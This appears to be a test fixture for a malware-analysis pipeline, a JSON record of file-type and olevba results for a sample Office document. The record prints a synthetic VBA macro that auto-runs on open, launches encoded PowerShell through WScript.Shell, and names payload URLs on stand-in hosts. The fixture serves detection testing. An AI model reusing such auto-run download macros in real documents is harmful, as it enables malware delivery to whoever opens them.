@@ -1,0 +1,107 @@
+{
+  "form": 1,
+  "observables": {
+    "file:cb9b4fbce26078135c8fd041589c04f7bbdfc7dacae6f5d950c1d9e10b0d8a73": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_form_strings.doc": {
+          "type=email.attachment": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/x-ole-storage",
+            "type": "Composite Document File V2 Document, Cannot read section info"
+          },
+          "summary": "File Type Analysis: Composite Document File V2 Document, Cannot read section info (application/x-ole-storage) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "base64 string": 1,
+              "hex string": 1,
+              "ioc": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/vba_form_strings.doc",
+                "local_path": "e058931096278bcc4a93d131d179150561912d4070407e7daceb5e1117789b8c",
+                "stream_path": "Macros/VBA/Module1",
+                "vba_code": "Sub AutoOpen()\n  x = CreateObject(\"WScript.Shell\").Run(\"powershell -enc 4D5A9000 aHR0cDovL2V4YW1wbGUuY29tL3g=\")\n  y = \"http://example.com/payload.exe\" & \"http://192.0.2.1:8080/a b.vbs\"\n  z = \"VGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4=\" & \"68747470733a2f2f6578616d706c652e6f72672f\"\n  a = StrReverse(\"6578652e\") & Chr(65) & \"ab\" & vbHide & \"\b\"\n  Button1_Click: Workbook_Open\n  .Variables(\"a\")\nEnd Sub",
+                "vba_filename": "Module1.bas"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (1 macro files) (OLE) | autoexec=1, suspicious=1, ioc=1, hex string=1, base64 string=1",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true
+      }
+    },
+    "file:e058931096278bcc4a93d131d179150561912d4070407e7daceb5e1117789b8c": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "vba_form_strings.doc.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:cb9b4fbce26078135c8fd041589c04f7bbdfc7dacae6f5d950c1d9e10b0d8a73",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with overstriking"
+          },
+          "summary": "File Type Analysis: ASCII text, with overstriking (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    }
+  }
+}
